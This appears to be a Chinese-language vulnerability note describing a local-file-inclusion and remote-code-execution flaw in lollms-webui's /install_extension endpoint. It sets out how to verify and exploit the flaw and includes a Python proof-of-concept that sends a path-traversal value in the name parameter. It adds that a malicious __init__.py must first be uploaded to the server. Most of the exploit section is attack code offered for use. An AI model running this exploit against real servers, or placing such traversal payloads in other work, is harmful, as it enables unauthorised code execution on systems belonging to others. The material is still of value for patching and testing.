验证漏洞存在方法
    - 尝试访问目标lollms-webui实例的/install_extension端点
    - 发送包含恶意name参数的POST请求，观察服务器响应
    - 检查服务器是否加载并执行了恶意__init__.py文件

漏洞利用方法
    - 该漏洞存在于lollms-webui的/install_extension端点，由于对name参数处理不当导致本地文件包含(LFI)和任意代码执行
    - 攻击者可以构造恶意的name参数，使服务器从任意位置（如讨论上传目录）加载并执行__init__.py文件
    - 漏洞影响最新版本的parisneo/lollms-webui，当应用暴露在外部端点或以无头模式运行时，无需用户交互即可实现远程代码执行
    
    - **PoC示例**:
    ```python
    import requests
    import json
    
    # 目标URL
    target_url = "http://target-ip:9600/install_extension"
    
    # 恶意payload - 利用本地文件包含执行任意代码
    malicious_payload = {
        "name": "../../../../../../tmp/malicious_extension"
    }
    
    # 发送恶意请求
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(
            target_url,
            data=json.dumps(malicious_payload),
            headers=headers,
            timeout=10
        )
        
        print(f"状态码: {response.status_code}")
        print(f"响应内容: {response.text}")
        
        if response.status_code == 200:
            print("漏洞可能存在 - 服务器接受了恶意请求")
        else:
            print("漏洞可能不存在或已被修复")
            
    except Exception as e:
        print(f"请求失败: {e}")
    ```
    
    **注意**: 实际利用需要先在目标服务器上上传包含恶意代码的__init__.py文件到可访问的目录，然后通过name参数引用该路径。
